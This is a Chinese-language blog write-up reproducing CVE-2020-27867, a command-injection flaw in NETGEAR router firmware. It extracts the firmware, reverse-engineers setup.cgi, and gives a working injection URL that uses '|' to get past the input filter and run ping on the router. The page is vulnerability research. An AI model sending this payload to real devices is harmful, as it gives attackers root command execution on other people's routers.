

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.png">
  <link rel="icon" href="/img/avatar.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="arttnba3">
  <meta name="keywords" content="">
  
    <meta name="description" content="MIPS å¤§æ³•å¥½">
<meta property="og:type" content="article">
<meta property="og:title" content="ã€CVE.0x04ã€‘CVE-2020-27867 NETGEAR è·¯ç”±å™¨ RCE æ¼æ´å¤ç°åŠç®€è¦åˆ†æ">
<meta property="og:url" content="http://blog.arttnba3.cn/2021/08/17/CVE-0X04-CVE-2020-27867/index.html">
<meta property="og:site_name" content="arttnba3&#39;s blog">
<meta property="og:description" content="MIPS å¤§æ³•å¥½">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://i.loli.net/2021/08/21/avRNSBKC2YszMUW.png">
<meta property="article:published_time" content="2021-08-17T03:50:50.000Z">
<meta property="article:modified_time" content="2021-11-12T19:41:12.000Z">
<meta property="article:author" content="arttnba3">
<meta property="article:tag" content="Linux">
<meta property="article:tag" content="Pwn">
<meta property="article:tag" content="CVE">
<meta property="article:tag" content="Netgear">
<meta property="article:tag" content="Remote Code Execute">
<meta property="article:tag" content="Command Injection">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://i.loli.net/2021/08/21/avRNSBKC2YszMUW.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>ã€CVE.0x04ã€‘CVE-2020-27867 NETGEAR è·¯ç”±å™¨ RCE æ¼æ´å¤ç°åŠç®€è¦åˆ†æ - arttnba3&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"blog.arttnba3.cn","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"Â§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="arttnba3's blog" type="application/atom+xml">
</head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 80vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>arttnba3&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                é¦–é¡µ
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                å½’æ¡£
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                åˆ†ç±»
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                æ ‡ç­¾
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                å…³äº
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                å‹é“¾
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/atom.xml">
                <i class="iconfont icon-rss"></i>
                rss
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://i.loli.net/2021/08/21/LvBZTUi3R9l6Ish.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="ã€CVE.0x04ã€‘CVE-2020-27867 NETGEAR è·¯ç”±å™¨ RCE æ¼æ´å¤ç°åŠç®€è¦åˆ†æ"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2021-08-17 11:50" pubdate>
          2021å¹´8æœˆ17æ—¥ ä¸­åˆ
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          4.9k å­—
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          41 åˆ†é’Ÿ
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> æ¬¡
        </span>
        
      
    
  </div>


        
      </div>

      
        <div class="scroll-down-bar">
          <i class="iconfont icon-arrowdown"></i>
        </div>
      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">ã€CVE.0x04ã€‘CVE-2020-27867 NETGEAR è·¯ç”±å™¨ RCE æ¼æ´å¤ç°åŠç®€è¦åˆ†æ</h1>
            
              <p class="note note-info">
                
                  
                    æœ¬æ–‡æœ€åæ›´æ–°äºï¼š2021å¹´11æœˆ13æ—¥ å‡Œæ™¨
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <p><s>MIPS å¤§æ³•å¥½</s></p>
<span id="more"></span>
<p>MIPS å¤ªæ†¨æ†¨äº†ï¼Œè¿˜æ˜¯ X86 å¥½ï¼ˆæ¼ï¼‰</p>
<h1>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1>
<blockquote>
<p>ä»¥ä¸‹éƒ½æ˜¯åºŸè¯233333</p>
</blockquote>
<p><strong>ç¾å›½ç½‘ä»¶å…¬å¸</strong>ï¼ˆ<strong>NETGEAR</strong>ï¼‰æ˜¯ä¸€å®¶ä¸“é—¨åšç½‘ç»œè®¾å¤‡çš„å…¬å¸ã€‚åœ¨2020å¹´æœ«å…¶æ——ä¸‹å¤šæ¬¾è·¯ç”±å™¨äº§å“è¢«çˆ†å‡ºå­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´â€”â€”mini_httpd æœåŠ¡ä¸­å¯¹å…¶æä¾›çš„<strong>å¸†æ¸¸åŠ é€Ÿå™¨</strong>åŠŸèƒ½çš„å‚æ•°è§£æå­˜åœ¨ç¼ºé™·ä»è€Œå¯¼è‡´å¯ä»¥è¿›è¡Œå‘½ä»¤æ³¨å…¥ï¼Œä»è€Œåœ¨è¿œç¨‹ä¸»æœºæ‰§è¡Œä»»æ„ä»£ç â€”â€”è™½ç„¶æ­¤ç§åˆ©ç”¨éœ€è¦èº«ä»½éªŒè¯ï¼Œä½†æ®æ‚‰ç°æœ‰çš„èº«ä»½éªŒè¯æœºåˆ¶å¹¶ä¸éš¾ç»•è¿‡</p>
<p>åœ¨ <a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-27867">cve.mitre.org</a> ä¸Šå¯¹è¯¥æ¼æ´è¯´æ˜å¦‚ä¸‹ï¼š</p>
<blockquote>
<p>This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of NETGEAR R6020, R6080, R6120, R6220, R6260, R6700v2, R6800, R6900v2, R7450, JNR3210, WNR2020, Nighthawk AC2100, and Nighthawk AC2400 routers. Although authentication is required to exploit this vulnerability, the existing authentication mechanism can be bypassed. The specific flaw exists within the mini_httpd service, which listens on TCP port 80 by default. When parsing the funjsq_access_token parameter, the process does not properly validate a user-supplied string before using it to execute a system call. An attacker can leverage this vulnerability to execute code in the context of root. Was ZDI-CAN-11653.</p>
</blockquote>
<h2 id="å½±å“ç‰ˆæœ¬">å½±å“ç‰ˆæœ¬</h2>
<p>å‚è§<a target="_blank" rel="noopener" href="https://kb.netgear.com/000062641/Security-Advisory-for-Password-Recovery-Vulnerabilities-on-Some-Routers">å®˜ç½‘</a></p>
<h2 id="å¤ç°ç¯å¢ƒæ­å»º">å¤ç°ç¯å¢ƒæ­å»º</h2>
<p>ç¬”è€…æœ¬äººæ¯”è¾ƒç©·ï¼Œä¹°ä¸èµ·ç½‘ä»¶çš„è·¯ç”±å™¨ï¼ˆå“­å“­ï¼‰ï¼Œä½†æœ€ç»ˆè¿˜æ˜¯æœ‰å¹¸ä»æœ‹å‹é‚£å€Ÿæ¥äº†ä¸€å° R6800 æœºå™¨ï¼Œå¾—ä»¥å¯¹è¯¥æ¼æ´è¿›è¡Œå¤ç°</p>
<p><img src="https://i.loli.net/2021/08/20/8hxInwiBy1zQHjb.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<blockquote>
<p>å‰é¢è¿™å‡ ç™¾å­—è®²äº†ä¸€å †åºŸè¯å€’æ˜¯çœŸçš„hhhh</p>
</blockquote>
<h1>0x01.æ¼æ´åˆ†æ</h1>
<h2 id="æ–‡ä»¶æå–">æ–‡ä»¶æå–</h2>
<p>é¦–å…ˆåœ¨<a target="_blank" rel="noopener" href="https://www.netgear.com/support/product/R6800.aspx#Firmware%20Version%201.2.0.74">å®˜ç½‘</a>ä¸‹è½½å¯¹åº”ç‰ˆæœ¬ï¼ˆ1.2.0.74ï¼‰çš„å›ºä»¶ï¼Œè§£å‹åå¾—åˆ°ä¸€ä¸ª img é•œåƒæ–‡ä»¶</p>
<p>ä½¿ç”¨ binwalk æå–å…¶ä¸­çš„å†…å®¹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">binwalk -e</span> <br></code></pre></td></tr></table></figure>
<p>å¾—åˆ°ä¸¤ä¸ªæ–‡ä»¶ <code>200.zip </code> å’Œ <code>R6950.bin</code>ï¼Œå…¶ä¸­å‰è€…ä¸ºåè€…çš„å‹ç¼©åŒ…ï¼Œç»§ç»­ä½¿ç”¨ binwalk è§£å‹åè€…ï¼Œå¾—åˆ°çš„ <code>squashfs-root</code> æ–‡ä»¶å¤¹ä¾¿æ˜¯è¯¥è®¾å¤‡çš„æ–‡ä»¶ç³»ç»Ÿ</p>
<p>åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­æœ‰ç€å¤§é‡çš„è½¯é“¾æ¥ï¼Œå¤§éƒ¨åˆ†æœ€ç»ˆéƒ½æ˜¯æŒ‡å‘ <code>usr/sbin</code> ç›®å½•ï¼Œç›¸åº”åœ° <code>init</code> è¿›ç¨‹æŒ‡å‘çš„æ˜¯ <code>usr/sbin/busybox</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ll</span><br>total 84<br>drwxr-xr-x 12 arttnba3 arttnba3  4096 Aug 18 20:14 ./<br>drwxrwxr-x  3 arttnba3 arttnba3  4096 Aug 18 20:56 ../<br>lrwxrwxrwx  1 arttnba3 arttnba3     9 Aug 17  2020 bin -&gt; usr/sbin//<br>drwxrwxr-x  2 arttnba3 arttnba3  4096 Aug 15  2015 data/<br>drwxr-xr-x  2 arttnba3 arttnba3  4096 Oct 18  2015 dev/<br>lrwxrwxrwx  1 arttnba3 arttnba3     8 Aug 17  2020 etc -&gt; /tmp/etc<br>lrwxrwxrwx  1 arttnba3 arttnba3    11 Aug 17  2020 etc_ro -&gt; /tmp/etc_ro<br>lrwxrwxrwx  1 arttnba3 arttnba3    20 Aug 17  2020 home -&gt; /tmp/home_directory/<br>lrwxrwxrwx  1 arttnba3 arttnba3    11 Aug 17  2020 init -&gt; bin/busybox*<br>drwxr-xr-x  6 arttnba3 arttnba3 12288 Aug 17  2020 lib/<br>drwxr-xr-x  2 arttnba3 arttnba3  4096 Dec  2  2012 media/<br>lrwxrwxrwx  1 arttnba3 arttnba3     8 Aug 17  2020 mnt -&gt; /tmp/mnt<br>drwxrwxr-x  6 arttnba3 arttnba3  4096 Aug 17  2020 opt/<br>drwxr-xr-x  2 arttnba3 arttnba3  4096 Nov 12  2000 proc/<br>lrwxrwxrwx  1 arttnba3 arttnba3     9 Aug 17  2020 sbin -&gt; usr/sbin//<br>drwxr-xr-x  2 arttnba3 arttnba3  4096 Nov 16  2008 sys/<br>drwxr-xr-x  2 arttnba3 arttnba3  4096 Jul 28  2000 tmp/<br>drwxr-xr-x 11 arttnba3 arttnba3  4096 Aug 18 18:59 usr/<br>lrwxrwxrwx  1 arttnba3 arttnba3     8 Aug 17  2020 var -&gt; /tmp/var<br>lrwxrwxrwx  1 arttnba3 arttnba3     8 Aug 17  2020 www -&gt; /tmp/www<br>drwxrwxr-x  8 arttnba3 arttnba3 32768 Aug 17  2020 www.eng/<br></code></pre></td></tr></table></figure>
<p>åœ¨ <code>usr</code> ç›®å½•ä¸‹è¿˜æœ‰ä¸€ä¸ªæ–‡ä»¶ <code>funjsq_plugin_netgear_r6800.tar.gz</code>ï¼Œè§£å‹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tar -zxvf funjsq_plugin_netgear_r6800.tar.gz</span><br>./tmp/<br>./tmp/funjsq/<br>./tmp/funjsq/bin/<br>./tmp/funjsq/bin/funjsq_cli<br>./tmp/funjsq/bin/funjsq_ctl<br>./tmp/funjsq/bin/funjsq_nslookup<br>./tmp/funjsq/bin/funjsq_conntime<br>./tmp/funjsq/bin/funjsq_daemon<br>./tmp/funjsq/bin/funjsq_detect<br>./tmp/funjsq/bin/funjsq_dns<br>./tmp/funjsq/bin/funjsq_httpd<br>./tmp/funjsq/bin/funjsq_inetd<br>./tmp/funjsq/bin/funjsq_redis<br>./tmp/funjsq/bin/funjsq.sh<br>./tmp/funjsq/config/<br>./tmp/funjsq/config/dnsmasq.d/<br>./tmp/funjsq/config/dnsmasq.d/funjsq101.conf<br>./tmp/funjsq/config/dnsmasq.d/blocklistDL.conf<br>./tmp/funjsq/config/dnsmasq.d/blocklistGW.conf<br>./tmp/funjsq/config/dnsmasq.d/funjsq100.conf<br>./tmp/funjsq/config/values/<br>./tmp/funjsq/config/funjsqdetect.dat<br>./tmp/funjsq/config/funjsqMSG.json<br>./tmp/funjsq/config/funjsq_ca<br>./tmp/funjsq/config/httpd/<br>./tmp/funjsq/config/httpd/key.pem<br>./tmp/funjsq/config/httpd/cert.pem<br></code></pre></td></tr></table></figure>
<h2 id="ç¨‹åºåˆ†æ">ç¨‹åºåˆ†æ</h2>
<p>åœ¨æ¼æ´é€šå‘Šä¸­è¯´åˆ°è¯¥æ¼æ´å­˜åœ¨äº <code>mini_httpd</code> æœåŠ¡ä¸­</p>
<p><img src="https://i.loli.net/2021/08/20/SXIgiqxByhKYQMr.png" srcset="/img/loading.gif" lazyload alt="img.png"></p>
<p>ç”¨ <code>burp suite</code>ç®€å•æµ‹è¯•ä¸€ä¸‹æˆ‘ä»¬å¯ä»¥å‘ç°å¤§éƒ¨åˆ† http è¯·æ±‚éƒ½æ˜¯é€šè¿‡ <code>setup.cgi</code> æ¥è¿›è¡Œçš„ï¼Œè¯¥æ–‡ä»¶å­˜åœ¨äº <code>/usr/sbin/</code> ç›®å½•ä¸‹</p>
<p><img src="https://i.loli.net/2021/08/20/XdMjNzGWLQU19HY.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ‹–å…¥ IDAè¿›è¡Œåˆ†æï¼ŒæŸ¥æ‰¾ <code>funjsq_access_token</code> å­—ç¬¦ä¸²</p>
<p><img src="https://i.loli.net/2021/08/23/SKiMvXBaIEN4Wmc.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>XREF åˆ° <code>sub_407C80()</code> å‡½æ•°ï¼Œå…¶ä¸­ä¼šé€šè¿‡ <code>find_val()</code> å‡½æ•°æå–å‡º <code>funjsq_access_token</code> å‚æ•°ï¼Œè¿›è¡Œå‘½ä»¤æ‹¼æ¥åé€šè¿‡ <code>COMMAND()</code>ï¼ˆæœ¬è´¨ä¸Šå…¶å®å°±æ˜¯ shï¼‰æ‰§è¡Œï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯<strong>è‹¥æ˜¯èƒ½å¤Ÿæ’å…¥è¯¸å¦‚ &quot;;&quot; æˆ–è€… &quot;&amp;&amp;&quot; è¿™æ ·çš„åˆ†éš”ç¬¦ç­‰ï¼Œä¾¿èƒ½å¤Ÿæ‰§è¡Œæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œå³å­˜åœ¨ä¸€ä¸ªå‘½ä»¤æ³¨å…¥çš„ RCE æ¼æ´</strong></p>
<p><img src="https://i.loli.net/2021/08/20/m5fCVtKqwzlQBsj.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>è°ƒç”¨å›æº¯ï¼Œå‘ç°ä¸€å¼ å¦‚ä¸‹ç»“æ„çš„å‡½æ•°è¡¨ï¼Œæˆ‘ä»¬çš„ <code>sub_407C80()</code> åˆšå¥½å¯¹åº” <code>funjsq_login</code>ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">typedef</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> * func_name;<br>    <span class="hljs-type">void</span> (*func_ptr)();<br>&#125;StrFunc;<br></code></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/08/20/uWcTf9iBQneAkaL.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æˆ‘ä»¬å¯ä»¥å‘ç°åœ¨ <code>CallActionByName()</code> å‡½æ•°ä¸­ä¼šæ ¹æ®ä¼ å…¥çš„å­—ç¬¦ä¸²é€šè¿‡å‡½æ•°è¡¨è°ƒç”¨å¯¹åº”çš„å‡½æ•°</p>
<p><img src="https://i.loli.net/2021/08/20/Gbphgm5K9OJCM2R.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æœ€åå›æº¯åˆ° main å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°å¯¹äºä¼ å…¥çš„ todo å‚æ•°è€Œè¨€å…¶ä¼šè°ƒç”¨ <code>CallActionByName()</code> å‡½æ•°è¿›è¡Œè§£æ</p>
<p><img src="https://i.loli.net/2021/08/20/dhx4v6E2DR9PLaf.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>åœ¨ main å‡½æ•°ä¸­æ‰§è¡Œåˆ°è¯¥æ®µä»£ç ä¹‹å‰è¿˜æœ‰ä¸€ç³»åˆ—çš„æ£€æŸ¥ï¼Œä¸è¿‡<strong>ä¸»è¦é’ˆå¯¹ POST è¯·æ±‚</strong>ï¼Œæ•…æˆ‘ä»¬å¯ä»¥ç›´æ¥èµ° GET è¯·æ±‚æ¥é¿å…ä¸€ç³»åˆ—çš„æ£€æŸ¥</p>
<p>æœ€ç»ˆæˆ‘ä»¬å¯ä»¥çŸ¥é“é€šè¿‡å¦‚ä¸‹ payload ä¾¿èƒ½å¤Ÿè·³è½¬åˆ°å‡ºç°é—®é¢˜çš„ <code>sub_407C80()</code> å‡½æ•°ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://192.168.1.1/setup.cgi?todo=funjsq_login&amp;next_file=basic_wait.htm&amp;funjsq_access_token=<br></code></pre></td></tr></table></figure>
<blockquote>
<p>åœ¨ <code>find_val()</code> ä¸­è¿˜ä¼šå¯¹å‘½ä»¤æ³¨å…¥è¿›è¡Œè¿‡æ»¤ï¼Œä¸è¿‡åŠŸèƒ½è¾ƒå¼±<img src="https://i.loli.net/2021/08/20/L9VZUiDAlJcme1v.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
</blockquote>
<h1>0x02.æ¼æ´åˆ©ç”¨</h1>
<p><strong>è¯¥æ¼æ´ä»…éªŒè¯ç”¨æˆ·ï¼ˆå¯ä»¥ç™»å…¥è·¯ç”±å™¨é¡µé¢ï¼‰å¯ä»¥ä½¿ç”¨</strong>ï¼Œå¸¸è§„æƒ…å†µä¸‹åˆ™è¿˜éœ€è¦æƒ³æ–¹æ³•ç»•è¿‡ç”¨æˆ·éªŒè¯</p>
<blockquote>
<p>åˆšå¼€å§‹å­¦webï¼Œè¿™ä¸ªçœŸä¸ä¼šâ€¦å…ˆæŠŠäºŒè¿›åˆ¶çš„éƒ¨åˆ†ï¼ˆæœ¬æ¼æ´ï¼‰æ•´å¥½å…ˆâ€¦</p>
</blockquote>
<h2 id="poc">poc</h2>
<p>åœ¨ mini_httpd æœåŠ¡ä¸­ä¼¼ä¹<strong>æœ‰ç€ä¸€å®šçš„è¿‡æ»¤çš„æœºåˆ¶</strong>ï¼Œè¯¸å¦‚ <code>;</code>ã€<code>&amp;&amp;</code>ã€<code>||</code>ç­‰éƒ½ä¼šè¢«è¿‡æ»¤æ‰ï¼Œç›´æ¥è¿”å› 403</p>
<p><img src="https://i.loli.net/2021/08/20/XFigLkICoSzARhW.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æœ€ç»ˆç¬”è€…ä½¿ç”¨<code>|</code><strong>æˆåŠŸç»•è¿‡</strong>ï¼Œç¬”è€…åœ¨è¿™é‡Œé€‰æ‹©æ‰§è¡Œ <code>ping</code> æŒ‡ä»¤ç®€å•çœ‹ä¸€ä¸‹æ•ˆæœ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://192.168.1.1/setup.cgi?todo=funjsq_login&amp;next_file=basic_wait.htm&amp;funjsq_access_token=|ping%20-c5%20sec.arttnba3.cn<br></code></pre></td></tr></table></figure>
<p>è‹¥æ˜¯æˆåŠŸè¿›å…¥æ‰§è¡Œå‘½ä»¤çš„æµç¨‹åˆ™åº”å½“æœ‰å¦‚ä¸‹å›æ˜¾ï¼Œè§åˆ°è¿™ä¸ªå›æ˜¾è¯´æ˜ä»£ç æˆåŠŸæ‰§è¡Œåˆ°äº†è¯¥å¤„</p>
<p><img src="https://i.loli.net/2021/08/20/2pYtRXjylSdGo1B.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><img src="https://i.loli.net/2021/08/20/AfZ6pSCdoBI1qUe.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ç¬”è€…ä½¿ç”¨ <code>tcpdump -i eth0 icmp</code> å‘½ä»¤åœ¨æœåŠ¡å™¨ä¸ŠæŸ¥çœ‹å‘ç°æœç„¶æˆåŠŸæ”¶åˆ°äº†æ¥è‡ªè¯¥è·¯ç”±å™¨çš„ ping åŒ…ï¼Œå‘½ä»¤æ‰§è¡ŒæˆåŠŸ</p>
<p><img src="https://i.loli.net/2021/08/20/qKhQGyHNmUOSkIP.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<blockquote>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ <code>COMMAND()</code> æ‰§è¡Œå‘½ä»¤æ—¶ä¼šç­‰å¾…å…¶è¿”å›æ‰ä¼šæ‰§è¡Œä¸‹ä¸€æ¡å‘½ä»¤ï¼Œæ•…è‹¥æ˜¯éœ€è¦åŒæ—¶æ‰§è¡Œå¤šä¸ªå‘½ä»¤åº”å½“ä½¿ç”¨ <code>&amp;</code>ï¼ˆurlç¼–ç <code>%26</code>ï¼‰å°†ä¸€äº›é•¿æœŸæ‰§è¡Œçš„å‘½ä»¤è½¬å…¥åå°æ‰§è¡Œï¼Œå¦åˆ™å…¶ä¼šä¸€ç›´ç­‰å¾…å½“å‰å‘½ä»¤æ‰§è¡Œå®Œæ¯•åæ‰ä¼šæ‰§è¡Œä¸‹ä¸€æ¡å‘½ä»¤</p>
<blockquote>
<p>åˆšæ‹¿åˆ°å‘½ä»¤æ‰§è¡Œæ—¶æˆ‘æ‰§è¡Œäº† <code>ping my_server_address</code>ï¼Œæ²¡æœ‰é™åˆ¶æ¬¡æ•°ï¼Œå¯¼è‡´åç»­å‘½ä»¤éƒ½å¡åœ¨äº† ping åè¾¹æ²¡æ³•æ‰§è¡Œï¼Œæœ€åæˆ‘å’Œå­¦é•¿åœ¨å…¬å¸çœ‹äº†å››åˆ†ä¹‹ä¸€ä¸ªä¸‹åˆæ‰å‘ç°è¿™ä¸ªç„å­¦é—®é¢˜çš„æˆå› â€¦</p>
</blockquote>
</blockquote>
<h2 id="exp">exp</h2>
<p>è¿™å°æœºå­è‡ªå¸¦ <code>telnet</code>ï¼Œç›´æ¥é€šè¿‡ telnet è¿æ¥ä¸Šå»å³å¯</p>
